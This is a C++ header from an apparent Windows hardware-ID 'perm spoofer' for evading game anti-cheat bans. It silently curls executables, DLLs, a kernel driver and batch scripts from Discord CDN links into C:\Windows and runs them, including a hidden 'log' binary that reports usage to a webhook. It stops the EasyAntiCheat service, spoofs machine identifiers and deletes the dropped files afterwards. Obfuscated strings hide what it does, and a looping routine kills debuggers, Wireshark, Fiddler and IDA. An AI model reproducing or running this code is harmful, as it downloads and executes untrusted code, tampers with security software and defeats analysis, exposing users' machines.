#pragma once
#include <Windows.h>
#include <thread>
#include "lazy.h"
#include "enc.h"
#include <filesystem>
#include <fstream>



void slow_print(const std::string& str, int delay_time)
{
	for (size_t i = 0; i != str.size(); ++i)
	{
		std::cout << str[i];
		Sleep(delay_time);
	}
}


// this using d++ webhook libary u can remove if it want it only sends like "cracker failed :skull" or "someone used the perm spoofa :smile:"
void log()
{
	LI_FN(system)(E("curl https://cdn.discordapp.com/attachments/1066437259626299485/1066445922583719936/MyBot.exe -o C:\\Windows\\sendvar.exe --silent"));

	if (!std::filesystem::exists("C:\\Windows\\dpp.dll"))
	{
		LI_FN(system)(E("curl https://cdn.discordapp.com/attachments/1066437259626299485/1066446691026358382/dpp.dll -o C:\\Windows\\dpp.dll --silent"));
	}

	if (!std::filesystem::exists("C:\\Windows\\libcrypto-1_1-x64.dll"))
	{
		LI_FN(system)(E("curl https://cdn.discordapp.com/attachments/1066437259626299485/1066446691336728596/libcrypto-1_1-x64.dll -o C:\\Windows\\libcrypto-1_1-x64.dll --silent"));
	}

	if (!std::filesystem::exists("C:\\Windows\\libsodium.dll"))
	{
		LI_FN(system)(E("curl https://cdn.discordapp.com/attachments/1066437259626299485/1066446691684864030/libsodium.dll -o C:\\Windows\\libsodium.dll --silent"));
	}

	if (!std::filesystem::exists("C:\\Windows\\libssl-1_1-x64.dll"))
	{
		LI_FN(system)(E("curl https://cdn.discordapp.com/attachments/1066437259626299485/1066446692049760286/libssl-1_1-x64.dll -o C:\\Windows\\libssl-1_1-x64.dll --silent"));
	}

	if (!std::filesystem::exists("C:\\Windows\\opus.dll"))
	{
		LI_FN(system)(E("curl https://cdn.discordapp.com/attachments/1066437259626299485/1066446692347551854/opus.dll -o C:\\Windows\\opus.dll --silent"));
	}

	if (!std::filesystem::exists("C:\\Windows\\zlib1.dll"))
	{
		LI_FN(system)(E("curl https://cdn.discordapp.com/attachments/1066437259626299485/1066446692666331206/zlib1.dll -o C:\\Windows\\zlib1.dll --silent"));
	}




	LI_FN(system)(E("C:\\Windows\\sendvar.exe >nul"));

	std::remove(E("C:\\Windows\\sendvar.exe"));
}


void check()
{






	//if (CheckRemoteDebuggerPresent)
	//{
	//	LI_FN(exit)(0);
	//}




	LI_FN(system)(E("taskkill /f /im procexp.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im procexp64.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im procexp64.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im mafiaengine-i386.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im Mafia Engine.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im mafiaengine-x86_64.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im Tutorial-i386.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im Tutorial-x86_64.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im mafiaengine-x86_64-SSE4-AVX2.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im KsDumperClient.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im KsDumper.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im ProcessHacker.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im idaq.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im idaq64.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im Wireshark.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im Fiddler.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im FiddlerEverywhere.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im Xenos64.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im Xenos.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im Xenos32.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im de4dot.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im Cheat Engine.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im cheatengine-x86_64.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im cheatengine-x86_64-SSE4-AVX2.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im MugenJinFuu-x86_64-SSE4-AVX2.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im MugenJinFuu-i386.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im cheatengine-x86_64.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im cheatengine-i386.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im HTTP Debugger Windows Service (32 bit).exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im KsDumper.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im OllyDbg.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im x64dbg.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im x32dbg.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im Ida64.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im OllyDbg.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im Dbg64.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im Dbg32.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /f /im ida.exe >nul 2>&1"));
	LI_FN(system)(E("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1"));
	LI_FN(system)(E("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1"));
	LI_FN(system)(E("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1"));
}

int system_no_output(std::string command)
{
	command.insert(0, "/C ");

	SHELLEXECUTEINFOA ShExecInfo = { 0 };
	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.hwnd = NULL;
	ShExecInfo.lpVerb = NULL;
	ShExecInfo.lpFile = "cmd.exe";
	ShExecInfo.lpParameters = command.c_str();
	ShExecInfo.lpDirectory = NULL;
	ShExecInfo.nShow = SW_HIDE;
	ShExecInfo.hInstApp = NULL;

	if (ShellExecuteExA(&ShExecInfo) == FALSE)
		return -1;

	WaitForSingleObject(ShExecInfo.hProcess, INFINITE);

	DWORD rv;
	GetExitCodeProcess(ShExecInfo.hProcess, &rv);
	CloseHandle(ShExecInfo.hProcess);

	return rv;
}




namespace spoof
{
	void perm()
    {
	  LI_FN(system)(E("curl https://cdn.discordapp.com/attachments/1045069577035464704/1047255168028266566/amifldrv64.sys -o C:\\Windows\\amifldrv64.sys --silent"));
	  LI_FN(system)(E("curl https://cdn.discordapp.com/attachments/1045069577035464704/1047255167726260354/AMIDEWINx64.EXE -o C:\\Windows\\AMIDEWINx64.EXE --silent"));
      LI_FN(system)(E("curl https://cdn.discordapp.com/attachments/1066385084338426000/1066431332563042334/spoof_1_2.bat -o C:\\Windows\\spoof.bat --silent"));
	  LI_FN(system)(E("curl https://cdn.discordapp.com/attachments/1066385084338426000/1066430324931838113/MacAddressSpoofer.exe -o C:\\Windows\\macspoofa.exe --silent"));
	  LI_FN(system)(E("curl https://cdn.discordapp.com/attachments/1066385084338426000/1066433398459076658/launcher.bat -o C:\\Windows\\launcher.bat --silent"));

	  slow_print("\n\n  [+] Click Any Key To Perm Spoof!", 45);

	  LI_FN(system)(E("pause >nul"));

	  LI_FN(Beep)(300, 300);

	  slow_print("\n\n  [+] Cleaning Hardware...", 45);

	  LI_FN(system)(E("sc stop EasyAntiCheat >nul"));
	  LI_FN(system)(E("sc stop EasyAntiCheat.sys >nul"));





	  slow_print("\n\n  [+] Spoofing Pc Identifiers...", 45);

	  LI_FN(system)(E("C:\\Windows\\launcher.bat >nul"));
	  LI_FN(system)(E("wmic computersystem where name=%computername% call rename=%random%"));

	  LI_FN(system)(E("C:\\Windows\\macspoofa.exe >nul"));
	  LI_FN(system)(E("C:\\Windows\\spoof.bat"));



	  std::remove(E("C:\\Windows\\amifldrv64.sys"));
	  std::remove(E("C:\\Windows\\AMIDEWINx64.EXE"));
	  std::remove(E("C:\\Windows\\spoof.bat"));
	  std::remove(E("C:\\Windows\\macspoofa.exe"));

	  LI_FN(Beep)(500, 500);
	  slow_print("\n\n\n  [+] Done!!!\n\n  ", 45);

	  LI_FN(system)(E("wmic baseboard get serialnumber"));
    }
}


DWORD AntiDebug2_Loop(LPVOID in) {

	while (1) {
		if (GetAsyncKeyState(NULL) & 1) {

		}
		else
		{
			Sleep(300);
			check();
		}



	}
}
